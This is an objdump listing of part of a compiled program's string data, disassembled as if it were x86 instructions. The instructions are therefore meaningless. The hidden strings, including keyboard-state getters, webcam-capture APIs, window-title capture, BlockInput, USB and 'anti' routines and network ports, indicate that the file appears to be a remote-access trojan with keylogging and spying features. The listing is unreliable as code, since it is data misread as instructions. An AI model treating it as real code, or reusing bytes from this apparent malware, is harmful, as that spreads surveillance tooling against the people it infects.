  408b2a:	65 00 4b 65          	add    %cl,%gs:0x65(%ebx)
  408b2e:	79 62                	jns    0x408b92
  408b30:	6f                   	outsl  %ds:(%esi),(%dx)
  408b31:	61                   	popa
  408b32:	72 64                	jb     0x408b98
  408b34:	00 67 65             	add    %ah,0x65(%edi)
  408b37:	74 5f                	je     0x408b98
  408b39:	4b                   	dec    %ebx
  408b3a:	65 79 62             	gs jns 0x408b9f
  408b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3e:	61                   	popa
  408b3f:	72 64                	jb     0x408ba5
  408b41:	00 67 65             	add    %ah,0x65(%edi)
  408b44:	74 5f                	je     0x408ba5
  408b46:	53                   	push   %ebx
  408b47:	68 69 66 74 4b       	push   $0x4b746669
  408b4c:	65 79 44             	gs jns 0x408b93
  408b4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b50:	77 6e                	ja     0x408bc0
  408b52:	00 67 65             	add    %ah,0x65(%edi)
  408b55:	74 5f                	je     0x408bb6
  408b57:	43                   	inc    %ebx
  408b58:	61                   	popa
  408b59:	70 73                	jo     0x408bce
  408b5b:	4c                   	dec    %esp
  408b5c:	6f                   	outsl  %ds:(%esi),(%dx)
  408b5d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408b60:	45                   	inc    %ebp
  408b61:	6e                   	outsb  %ds:(%esi),(%dx)
  408b62:	75 6d                	jne    0x408bd1
  408b64:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  408b68:	70 70                	jo     0x408bda
  408b6a:	65 72 00             	gs jb  0x408b6d
  408b6d:	53                   	push   %ebx
  408b6e:	74 72                	je     0x408be2
  408b70:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b77:	64 65 72 00          	fs gs jb 0x408b7b
  408b7b:	67 65 74 5f          	addr16 gs je 0x408bde
  408b7f:	43                   	inc    %ebx
  408b80:	74 72                	je     0x408bf4
  408b82:	6c                   	insb   (%dx),%es:(%edi)
  408b83:	4b                   	dec    %ebx
  408b84:	65 79 44             	gs jns 0x408bcb
  408b87:	6f                   	outsl  %ds:(%esi),(%dx)
  408b88:	77 6e                	ja     0x408bf8
  408b8a:	00 52 65             	add    %dl,0x65(%edx)
  408b8d:	6d                   	insl   (%dx),%es:(%edi)
  408b8e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b8f:	76 65                	jbe    0x408bf6
  408b91:	00 4d 75             	add    %cl,0x75(%ebp)
  408b94:	6c                   	insb   (%dx),%es:(%edi)
  408b95:	74 69                	je     0x408c00
  408b97:	63 61 73             	arpl   %esp,0x73(%ecx)
  408b9a:	74 44                	je     0x408be0
  408b9c:	65 6c                	gs insb (%dx),%es:(%edi)
  408b9e:	65 67 61             	gs addr16 popa
  408ba1:	74 65                	je     0x408c08
  408ba3:	00 49 41             	add    %cl,0x41(%ecx)
  408ba6:	73 79                	jae    0x408c21
  408ba8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba9:	63 52 65             	arpl   %edx,0x65(%edx)
  408bac:	73 75                	jae    0x408c23
  408bae:	6c                   	insb   (%dx),%es:(%edi)
  408baf:	74 00                	je     0x408bb1
  408bb1:	41                   	inc    %ecx
  408bb2:	73 79                	jae    0x408c2d
  408bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bb5:	63 43 61             	arpl   %eax,0x61(%ebx)
  408bb8:	6c                   	insb   (%dx),%es:(%edi)
  408bb9:	6c                   	insb   (%dx),%es:(%edi)
  408bba:	62 61 63             	bound  %esp,0x63(%ecx)
  408bbd:	6b 00 53             	imul   $0x53,(%eax),%eax
  408bc0:	79 73                	jns    0x408c35
  408bc2:	74 65                	je     0x408c29
  408bc4:	6d                   	insl   (%dx),%es:(%edi)
  408bc5:	2e 43                	cs inc %ebx
  408bc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408bc8:	6c                   	insb   (%dx),%es:(%edi)
  408bc9:	6c                   	insb   (%dx),%es:(%edi)
  408bca:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408bcf:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd0:	73 2e                	jae    0x408c00
  408bd2:	47                   	inc    %edi
  408bd3:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bd5:	65 72 69             	gs jb  0x408c41
  408bd8:	63 00                	arpl   %eax,(%eax)
  408bda:	4c                   	dec    %esp
  408bdb:	69 73 74 60 31 00 41 	imul   $0x41003160,0x74(%ebx),%esi
  408be2:	64 64 00 67 65       	fs add %ah,%fs:0x65(%edi)
  408be7:	74 5f                	je     0x408c48
  408be9:	43                   	inc    %ebx
  408bea:	61                   	popa
  408beb:	70 61                	jo     0x408c4e
  408bed:	63 69 74             	arpl   %ebp,0x74(%ecx)
  408bf0:	79 00                	jns    0x408bf2
  408bf2:	67 65 74 5f          	addr16 gs je 0x408c55
  408bf6:	43                   	inc    %ebx
  408bf7:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf8:	75 6e                	jne    0x408c68
  408bfa:	74 00                	je     0x408bfc
  408bfc:	67 65 74 5f          	addr16 gs je 0x408c5f
  408c00:	49                   	dec    %ecx
  408c01:	74 65                	je     0x408c68
  408c03:	6d                   	insl   (%dx),%es:(%edi)
  408c04:	00 43 6c             	add    %al,0x6c(%ebx)
  408c07:	65 61                	gs popa
  408c09:	72 00                	jb     0x408c0b
  408c0b:	77 2e                	ja     0x408c3b
  408c0d:	65 78 65             	gs js  0x408c75
  408c10:	00 75 73             	add    %dh,0x73(%ebp)
  408c13:	65 72 33             	gs jb  0x408c49
  408c16:	32 00                	xor    (%eax),%al
  408c18:	75 73                	jne    0x408c8d
  408c1a:	65 72 33             	gs jb  0x408c50
  408c1d:	32 2e                	xor    (%esi),%ch
  408c1f:	64 6c                	fs insb (%dx),%es:(%edi)
  408c21:	6c                   	insb   (%dx),%es:(%edi)
  408c22:	00 77 69             	add    %dh,0x69(%edi)
  408c25:	6e                   	outsb  %ds:(%esi),(%dx)
  408c26:	6d                   	insl   (%dx),%es:(%edi)
  408c27:	6d                   	insl   (%dx),%es:(%edi)
  408c28:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408c2b:	6c                   	insb   (%dx),%es:(%edi)
  408c2c:	00 61 76             	add    %ah,0x76(%ecx)
  408c2f:	69 63 61 70 33 32 2e 	imul   $0x2e323370,0x61(%ebx),%esp
  408c36:	64 6c                	fs insb (%dx),%es:(%edi)
  408c38:	6c                   	insb   (%dx),%es:(%edi)
  408c39:	00 6b 65             	add    %ch,0x65(%ebx)
  408c3c:	72 6e                	jb     0x408cac
  408c3e:	65 6c                	gs insb (%dx),%es:(%edi)
  408c40:	33 32                	xor    (%edx),%esi
  408c42:	00 6e 74             	add    %ch,0x74(%esi)
  408c45:	64 6c                	fs insb (%dx),%es:(%edi)
  408c47:	6c                   	insb   (%dx),%es:(%edi)
  408c48:	00 4b 45             	add    %cl,0x45(%ebx)
  408c4b:	52                   	push   %edx
  408c4c:	4e                   	dec    %esi
  408c4d:	45                   	inc    %ebp
  408c4e:	4c                   	dec    %esp
  408c4f:	33 32                	xor    (%edx),%esi
  408c51:	2e 44                	cs inc %esp
  408c53:	4c                   	dec    %esp
  408c54:	4c                   	dec    %esp
  408c55:	00 6d 73             	add    %ch,0x73(%ebp)
  408c58:	63 6f 72             	arpl   %ebp,0x72(%edi)
  408c5b:	6c                   	insb   (%dx),%es:(%edi)
  408c5c:	69 62 00 4d 79 41 70 	imul   $0x7041794d,0x0(%edx),%esp
  408c63:	70 6c                	jo     0x408cd1
  408c65:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408c6c:	00 77 2e             	add    %dh,0x2e(%edi)
  408c6f:	4d                   	dec    %ebp
  408c70:	79 00                	jns    0x408c72
  408c72:	4d                   	dec    %ebp
  408c73:	79 43                	jns    0x408cb8
  408c75:	6f                   	outsl  %ds:(%esi),(%dx)
  408c76:	6d                   	insl   (%dx),%es:(%edi)
  408c77:	70 75                	jo     0x408cee
  408c79:	74 65                	je     0x408ce0
  408c7b:	72 00                	jb     0x408c7d
  408c7d:	4d                   	dec    %ebp
  408c7e:	79 50                	jns    0x408cd0
  408c80:	72 6f                	jb     0x408cf1
  408c82:	6a 65                	push   $0x65
  408c84:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408c88:	79 57                	jns    0x408ce1
  408c8a:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408c8e:	72 76                	jb     0x408d06
  408c90:	69 63 65 73 00 54 68 	imul   $0x68540073,0x65(%ebx),%esp
  408c97:	72 65                	jb     0x408cfe
  408c99:	61                   	popa
  408c9a:	64 53                	fs push %ebx
  408c9c:	61                   	popa
  408c9d:	66 65 4f             	gs dec %di
  408ca0:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ca3:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  408ca7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca8:	76 69                	jbe    0x408d13
  408caa:	64 65 72 60          	fs gs jb 0x408d0e
  408cae:	31 00                	xor    %eax,(%eax)
  408cb0:	54                   	push   %esp
  408cb1:	00 41 00             	add    %al,0x0(%ecx)
  408cb4:	77 00                	ja     0x408cb6
  408cb6:	4f                   	dec    %edi
  408cb7:	4b                   	dec    %ebx
  408cb8:	00 6b 6c             	add    %ch,0x6c(%ebx)
  408cbb:	00 6d 67             	add    %ch,0x67(%ebp)
  408cbe:	72 00                	jb     0x408cc0
  408cc0:	45                   	inc    %ebp
  408cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc2:	75 6d                	jne    0x408d31
  408cc4:	57                   	push   %edi
  408cc5:	69 6e 64 50 72 6f 63 	imul   $0x636f7250,0x64(%esi),%ebp
  408ccc:	00 45 6e             	add    %al,0x6e(%ebp)
  408ccf:	75 6d                	jne    0x408d3e
  408cd1:	43                   	inc    %ebx
  408cd2:	68 69 6c 64 57       	push   $0x57646c69
  408cd7:	69 6e 64 50 72 6f 63 	imul   $0x636f7250,0x64(%esi),%ebp
  408cde:	00 6d 5f             	add    %ch,0x5f(%ebp)
  408ce1:	43                   	inc    %ebx
  408ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce3:	6d                   	insl   (%dx),%es:(%edi)
  408ce4:	70 75                	jo     0x408d5b
  408ce6:	74 65                	je     0x408d4d
  408ce8:	72 4f                	jb     0x408d39
  408cea:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ced:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  408cf1:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf2:	76 69                	jbe    0x408d5d
  408cf4:	64 65 72 00          	fs gs jb 0x408cf8
  408cf8:	6d                   	insl   (%dx),%es:(%edi)
  408cf9:	5f                   	pop    %edi
  408cfa:	41                   	inc    %ecx
  408cfb:	70 70                	jo     0x408d6d
  408cfd:	4f                   	dec    %edi
  408cfe:	62 6a 65             	bound  %ebp,0x65(%edx)
  408d01:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  408d05:	6f                   	outsl  %ds:(%esi),(%dx)
  408d06:	76 69                	jbe    0x408d71
  408d08:	64 65 72 00          	fs gs jb 0x408d0c
  408d0c:	6d                   	insl   (%dx),%es:(%edi)
  408d0d:	5f                   	pop    %edi
  408d0e:	55                   	push   %ebp
  408d0f:	73 65                	jae    0x408d76
  408d11:	72 4f                	jb     0x408d62
  408d13:	62 6a 65             	bound  %ebp,0x65(%edx)
  408d16:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  408d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  408d1b:	76 69                	jbe    0x408d86
  408d1d:	64 65 72 00          	fs gs jb 0x408d21
  408d21:	6d                   	insl   (%dx),%es:(%edi)
  408d22:	5f                   	pop    %edi
  408d23:	4d                   	dec    %ebp
  408d24:	79 57                	jns    0x408d7d
  408d26:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408d2a:	72 76                	jb     0x408da2
  408d2c:	69 63 65 73 4f 62 6a 	imul   $0x6a624f73,0x65(%ebx),%esp
  408d33:	65 63 74 50 72       	arpl   %esi,%gs:0x72(%eax,%edx,2)
  408d38:	6f                   	outsl  %ds:(%esi),(%dx)
  408d39:	76 69                	jbe    0x408da4
  408d3b:	64 65 72 00          	fs gs jb 0x408d3f
  408d3f:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  408d43:	6f                   	outsl  %ds:(%esi),(%dx)
  408d44:	72 00                	jb     0x408d46
  408d46:	67 65 74 5f          	addr16 gs je 0x408da9
  408d4a:	43                   	inc    %ebx
  408d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4c:	6d                   	insl   (%dx),%es:(%edi)
  408d4d:	70 75                	jo     0x408dc4
  408d4f:	74 65                	je     0x408db6
  408d51:	72 00                	jb     0x408d53
  408d53:	67 65 74 5f          	addr16 gs je 0x408db6
  408d57:	41                   	inc    %ecx
  408d58:	70 70                	jo     0x408dca
  408d5a:	6c                   	insb   (%dx),%es:(%edi)
  408d5b:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408d62:	00 67 65             	add    %ah,0x65(%edi)
  408d65:	74 5f                	je     0x408dc6
  408d67:	55                   	push   %ebp
  408d68:	73 65                	jae    0x408dcf
  408d6a:	72 00                	jb     0x408d6c
  408d6c:	67 65 74 5f          	addr16 gs je 0x408dcf
  408d70:	57                   	push   %edi
  408d71:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408d75:	72 76                	jb     0x408ded
  408d77:	69 63 65 73 00 6f 00 	imul   $0x6f0073,0x65(%ebx),%esp
  408d7e:	47                   	inc    %edi
  408d7f:	65 74 54             	gs je  0x408dd6
  408d82:	79 70                	jns    0x408df4
  408d84:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  408d88:	65 61                	gs popa
  408d8a:	74 65                	je     0x408df1
  408d8c:	5f                   	pop    %edi
  408d8d:	5f                   	pop    %edi
  408d8e:	49                   	dec    %ecx
  408d8f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d90:	73 74                	jae    0x408e06
  408d92:	61                   	popa
  408d93:	6e                   	outsb  %ds:(%esi),(%dx)
  408d94:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  408d97:	5f                   	pop    %edi
  408d98:	00 69 6e             	add    %ch,0x6e(%ecx)
  408d9b:	73 74                	jae    0x408e11
  408d9d:	61                   	popa
  408d9e:	6e                   	outsb  %ds:(%esi),(%dx)
  408d9f:	63 65 00             	arpl   %esp,0x0(%ebp)
  408da2:	44                   	inc    %esp
  408da3:	69 73 70 6f 73 65 5f 	imul   $0x5f65736f,0x70(%ebx),%esi
  408daa:	5f                   	pop    %edi
  408dab:	49                   	dec    %ecx
  408dac:	6e                   	outsb  %ds:(%esi),(%dx)
  408dad:	73 74                	jae    0x408e23
  408daf:	61                   	popa
  408db0:	6e                   	outsb  %ds:(%esi),(%dx)
  408db1:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  408db4:	5f                   	pop    %edi
  408db5:	00 6d 61             	add    %ch,0x61(%ebp)
  408db8:	69 6e 00 54 49 50 00 	imul   $0x504954,0x0(%esi),%ebp
  408dbf:	54                   	push   %esp
  408dc0:	70 6f                	jo     0x408e31
  408dc2:	72 74                	jb     0x408e38
  408dc4:	00 64 65 6c          	add    %ah,0x6c(%ebp,%eiz,2)
  408dc8:	61                   	popa
  408dc9:	79 00                	jns    0x408dcb
  408dcb:	75 64                	jne    0x408e31
  408dcd:	70 00                	jo     0x408dcf
  408dcf:	62 00                	bound  %eax,(%eax)
  408dd1:	42                   	inc    %edx
  408dd2:	44                   	inc    %esp
  408dd3:	00 43 00             	add    %al,0x0(%ebx)
  408dd6:	43                   	inc    %ebx
  408dd7:	6e                   	outsb  %ds:(%esi),(%dx)
  408dd8:	00 44 52 00          	add    %al,0x0(%edx,%edx,2)
  408ddc:	45                   	inc    %ebp
  408ddd:	58                   	pop    %eax
  408dde:	45                   	inc    %ebp
  408ddf:	00 46 00             	add    %al,0x0(%esi)
  408de2:	46                   	inc    %esi
  408de3:	53                   	push   %ebx
  408de4:	00 48 00             	add    %cl,0x0(%eax)
  408de7:	48                   	dec    %eax
  408de8:	48                   	dec    %eax
  408de9:	00 49 64             	add    %cl,0x64(%ecx)
  408dec:	72 00                	jb     0x408dee
  408dee:	49                   	dec    %ecx
  408def:	73 46                	jae    0x408e37
  408df1:	00 49 73             	add    %cl,0x73(%ecx)
  408df4:	75 00                	jne    0x408df6
  408df6:	6b 71 00 6c          	imul   $0x6c,0x0(%ecx),%esi
  408dfa:	61                   	popa
  408dfb:	73 74                	jae    0x408e71
  408dfd:	63 61 70             	arpl   %esp,0x70(%ecx)
  408e00:	00 4c 4f 00          	add    %cl,0x0(%edi,%ecx,2)
  408e04:	4d                   	dec    %ebp
  408e05:	65 4d                	gs dec %ebp
  408e07:	00 4d 54             	add    %cl,0x54(%ebp)
  408e0a:	00 4e 48             	add    %cl,0x48(%esi)
  408e0d:	00 50 00             	add    %dl,0x0(%eax)
  408e10:	50                   	push   %eax
  408e11:	4c                   	dec    %esp
  408e12:	47                   	inc    %edi
  408e13:	00 52 47             	add    %dl,0x47(%edx)
  408e16:	00 73 66             	add    %dh,0x66(%ebx)
  408e19:	00 73 69             	add    %dh,0x69(%ebx)
  408e1c:	7a 6b                	jp     0x408e89
  408e1e:	00 56 4e             	add    %dl,0x4e(%esi)
  408e21:	00 56 52             	add    %dl,0x52(%esi)
  408e24:	00 59 00             	add    %bl,0x0(%ecx)
  408e27:	48                   	dec    %eax
  408e28:	44                   	inc    %esp
  408e29:	00 61 6e             	add    %ah,0x6e(%ecx)
  408e2c:	74 69                	je     0x408e97
  408e2e:	00 61 6e             	add    %ah,0x6e(%ecx)
  408e31:	74 69                	je     0x408e9c
  408e33:	32 00                	xor    (%eax),%al
  408e35:	75 73                	jne    0x408eaa
  408e37:	62 00                	bound  %eax,(%eax)
  408e39:	75 73                	jne    0x408eae
  408e3b:	62 78 00             	bound  %edi,0x0(%eax)
  408e3e:	74 61                	je     0x408ea1
  408e40:	73 6b                	jae    0x408ead
  408e42:	00 6d 67             	add    %ch,0x67(%ebp)
  408e45:	00 69 6d             	add    %ch,0x6d(%ecx)
  408e48:	00 61 30             	add    %ah,0x30(%ecx)
  408e4b:	00 61 31             	add    %ah,0x31(%ecx)
  408e4e:	00 41 43             	add    %al,0x43(%ecx)
  408e51:	54                   	push   %esp
  408e52:	00 42 53             	add    %al,0x53(%edx)
  408e55:	00 42 00             	add    %al,0x0(%edx)
  408e58:	43                   	inc    %ebx
  408e59:	61                   	popa
  408e5a:	6d                   	insl   (%dx),%es:(%edi)
  408e5b:	00 47 65             	add    %al,0x65(%edi)
  408e5e:	74 46                	je     0x408ea6
  408e60:	6f                   	outsl  %ds:(%esi),(%dx)
  408e61:	72 65                	jb     0x408ec8
  408e63:	67 72 6f             	addr16 jb 0x408ed5
  408e66:	75 6e                	jne    0x408ed6
  408e68:	64 57                	fs push %edi
  408e6a:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  408e71:	65 74 56             	gs je  0x408eca
  408e74:	6f                   	outsl  %ds:(%esi),(%dx)
  408e75:	6c                   	insb   (%dx),%es:(%edi)
  408e76:	75 6d                	jne    0x408ee5
  408e78:	65 49                	gs dec %ecx
  408e7a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e7b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408e7d:	72 6d                	jb     0x408eec
  408e7f:	61                   	popa
  408e80:	74 69                	je     0x408eeb
  408e82:	6f                   	outsl  %ds:(%esi),(%dx)
  408e83:	6e                   	outsb  %ds:(%esi),(%dx)
  408e84:	00 47 65             	add    %al,0x65(%edi)
  408e87:	74 56                	je     0x408edf
  408e89:	6f                   	outsl  %ds:(%esi),(%dx)
  408e8a:	6c                   	insb   (%dx),%es:(%edi)
  408e8b:	75 6d                	jne    0x408efa
  408e8d:	65 49                	gs dec %ecx
  408e8f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e90:	66 6f                	outsw  %ds:(%esi),(%dx)
  408e92:	72 6d                	jb     0x408f01
  408e94:	61                   	popa
  408e95:	74 69                	je     0x408f00
  408e97:	6f                   	outsl  %ds:(%esi),(%dx)
  408e98:	6e                   	outsb  %ds:(%esi),(%dx)
  408e99:	41                   	inc    %ecx
  408e9a:	00 6c 70 52          	add    %ch,0x52(%eax,%esi,2)
  408e9e:	6f                   	outsl  %ds:(%esi),(%dx)
  408e9f:	6f                   	outsl  %ds:(%esi),(%dx)
  408ea0:	74 50                	je     0x408ef2
  408ea2:	61                   	popa
  408ea3:	74 68                	je     0x408f0d
  408ea5:	4e                   	dec    %esi
  408ea6:	61                   	popa
  408ea7:	6d                   	insl   (%dx),%es:(%edi)
  408ea8:	65 00 6c 70 56       	add    %ch,%gs:0x56(%eax,%esi,2)
  408ead:	6f                   	outsl  %ds:(%esi),(%dx)
  408eae:	6c                   	insb   (%dx),%es:(%edi)
  408eaf:	75 6d                	jne    0x408f1e
  408eb1:	65 4e                	gs dec %esi
  408eb3:	61                   	popa
  408eb4:	6d                   	insl   (%dx),%es:(%edi)
  408eb5:	65 42                	gs inc %edx
  408eb7:	75 66                	jne    0x408f1f
  408eb9:	66 65 72 00          	data16 gs jb 0x408ebd
  408ebd:	6e                   	outsb  %ds:(%esi),(%dx)
  408ebe:	56                   	push   %esi
  408ebf:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec0:	6c                   	insb   (%dx),%es:(%edi)
  408ec1:	75 6d                	jne    0x408f30
  408ec3:	65 4e                	gs dec %esi
  408ec5:	61                   	popa
  408ec6:	6d                   	insl   (%dx),%es:(%edi)
  408ec7:	65 53                	gs push %ebx
  408ec9:	69 7a 65 00 6c 70 56 	imul   $0x56706c00,0x65(%edx),%edi
  408ed0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed1:	6c                   	insb   (%dx),%es:(%edi)
  408ed2:	75 6d                	jne    0x408f41
  408ed4:	65 53                	gs push %ebx
  408ed6:	65 72 69             	gs jb  0x408f42
  408ed9:	61                   	popa
  408eda:	6c                   	insb   (%dx),%es:(%edi)
  408edb:	4e                   	dec    %esi
  408edc:	75 6d                	jne    0x408f4b
  408ede:	62 65 72             	bound  %esp,0x72(%ebp)
  408ee1:	00 6c 70 4d          	add    %ch,0x4d(%eax,%esi,2)
  408ee5:	61                   	popa
  408ee6:	78 69                	js     0x408f51
  408ee8:	6d                   	insl   (%dx),%es:(%edi)
  408ee9:	75 6d                	jne    0x408f58
  408eeb:	43                   	inc    %ebx
  408eec:	6f                   	outsl  %ds:(%esi),(%dx)
  408eed:	6d                   	insl   (%dx),%es:(%edi)
  408eee:	70 6f                	jo     0x408f5f
  408ef0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ef1:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef3:	74 4c                	je     0x408f41
  408ef5:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef7:	67 74 68             	addr16 je 0x408f62
  408efa:	00 6c 70 46          	add    %ch,0x46(%eax,%esi,2)
  408efe:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  408f05:	65 
  408f06:	6d                   	insl   (%dx),%es:(%edi)
  408f07:	46                   	inc    %esi
  408f08:	6c                   	insb   (%dx),%es:(%edi)
  408f09:	61                   	popa
  408f0a:	67 73 00             	addr16 jae 0x408f0d
  408f0d:	6c                   	insb   (%dx),%es:(%edi)
  408f0e:	70 46                	jo     0x408f56
  408f10:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  408f17:	65 
  408f18:	6d                   	insl   (%dx),%es:(%edi)
  408f19:	4e                   	dec    %esi
  408f1a:	61                   	popa
  408f1b:	6d                   	insl   (%dx),%es:(%edi)
  408f1c:	65 42                	gs inc %edx
  408f1e:	75 66                	jne    0x408f86
  408f20:	66 65 72 00          	data16 gs jb 0x408f24
  408f24:	6e                   	outsb  %ds:(%esi),(%dx)
  408f25:	46                   	inc    %esi
  408f26:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  408f2d:	65 
  408f2e:	6d                   	insl   (%dx),%es:(%edi)
  408f2f:	4e                   	dec    %esi
  408f30:	61                   	popa
  408f31:	6d                   	insl   (%dx),%es:(%edi)
  408f32:	65 53                	gs push %ebx
  408f34:	69 7a 65 00 47 65 74 	imul   $0x74654700,0x65(%edx),%edi
  408f3b:	57                   	push   %edi
  408f3c:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408f43:	78 74                	js     0x408fb9
  408f45:	00 47 65             	add    %al,0x65(%edi)
  408f48:	74 57                	je     0x408fa1
  408f4a:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408f51:	78 74                	js     0x408fc7
  408f53:	41                   	inc    %ecx
  408f54:	00 68 57             	add    %ch,0x57(%eax)
  408f57:	6e                   	outsb  %ds:(%esi),(%dx)
  408f58:	64 00 57 69          	add    %dl,%fs:0x69(%edi)
  408f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5d:	54                   	push   %esp
  408f5e:	69 74 6c 65 00 4d 61 	imul   $0x78614d00,0x65(%esp,%ebp,2),%esi
  408f65:	78 
  408f66:	4c                   	dec    %esp
  408f67:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f69:	67 74 68             	addr16 je 0x408fd4
  408f6c:	00 47 65             	add    %al,0x65(%edi)
  408f6f:	74 57                	je     0x408fc8
  408f71:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408f78:	78 74                	js     0x408fee
  408f7a:	4c                   	dec    %esp
  408f7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f7d:	67 74 68             	addr16 je 0x408fe8
  408f80:	00 47 65             	add    %al,0x65(%edi)
  408f83:	74 57                	je     0x408fdc
  408f85:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408f8c:	78 74                	js     0x409002
  408f8e:	4c                   	dec    %esp
  408f8f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f91:	67 74 68             	addr16 je 0x408ffc
  408f94:	41                   	inc    %ecx
  408f95:	00 68 77             	add    %ch,0x77(%eax)
  408f98:	6e                   	outsb  %ds:(%esi),(%dx)
  408f99:	64 00 63 61          	add    %ah,%fs:0x61(%ebx)
  408f9d:	70 47                	jo     0x408fe6
  408f9f:	65 74 44             	gs je  0x408fe6
  408fa2:	72 69                	jb     0x40900d
  408fa4:	76 65                	jbe    0x40900b
  408fa6:	72 44                	jb     0x408fec
  408fa8:	65 73 63             	gs jae 0x40900e
  408fab:	72 69                	jb     0x409016
  408fad:	70 74                	jo     0x409023
  408faf:	69 6f 6e 41 00 77 44 	imul   $0x44770041,0x6e(%edi),%ebp
  408fb6:	72 69                	jb     0x409021
  408fb8:	76 65                	jbe    0x40901f
  408fba:	72 00                	jb     0x408fbc
  408fbc:	6c                   	insb   (%dx),%es:(%edi)
  408fbd:	70 73                	jo     0x409032
  408fbf:	7a 4e                	jp     0x40900f
  408fc1:	61                   	popa
  408fc2:	6d                   	insl   (%dx),%es:(%edi)
  408fc3:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  408fc7:	4e                   	dec    %esi
  408fc8:	61                   	popa
  408fc9:	6d                   	insl   (%dx),%es:(%edi)
  408fca:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
  408fcf:	7a 56                	jp     0x409027
  408fd1:	65 72 00             	gs jb  0x408fd4
  408fd4:	63 62 56             	arpl   %esp,0x56(%edx)
  408fd7:	65 72 00             	gs jb  0x408fda
  408fda:	43                   	inc    %ebx
  408fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdc:	6d                   	insl   (%dx),%es:(%edi)
  408fdd:	70 44                	jo     0x409023
  408fdf:	69 72 00 46 31 00 46 	imul   $0x46003146,0x0(%edx),%esi
  408fe6:	32 00                	xor    (%eax),%al
  408fe8:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  408feb:	6e                   	outsb  %ds:(%esi),(%dx)
  408fec:	65 63 74 00 44       	arpl   %esi,%gs:0x44(%eax,%eax,1)
  408ff1:	45                   	inc    %ebp
  408ff2:	42                   	inc    %edx
  408ff3:	00 73 00             	add    %dh,0x0(%ebx)
  408ff6:	44                   	inc    %esp
  408ff7:	4c                   	dec    %esp
  408ff8:	56                   	push   %esi
  408ff9:	00 6e 00             	add    %ch,0x0(%esi)
  408ffc:	45                   	inc    %ebp
  408ffd:	44                   	inc    %esp
  408ffe:	00 45 4e             	add    %al,0x4e(%ebp)
  409001:	42                   	inc    %edx
  409002:	00 47 54             	add    %al,0x54(%edi)
  409005:	56                   	push   %esi
  409006:	00 72 65             	add    %dh,0x65(%edx)
  409009:	74 00                	je     0x40900b
  40900b:	48                   	dec    %eax
  40900c:	57                   	push   %edi
  40900d:	44                   	inc    %esp
  40900e:	00 4d 48             	add    %cl,0x48(%ebp)
  409011:	00 61 70             	add    %ah,0x70(%ecx)
  409014:	69 42 6c 6f 63 6b 49 	imul   $0x496b636f,0x6c(%edx),%eax
  40901b:	6e                   	outsb  %ds:(%esi),(%dx)
  40901c:	70 75                	jo     0x409093
  40901e:	74 00                	je     0x409020
  409020:	42                   	inc    %edx
  409021:	6c                   	insb   (%dx),%es:(%edi)
  409022:	6f                   	outsl  %ds:(%esi),(%dx)
  409023:	63 6b 49             	arpl   %ebp,0x49(%ebx)
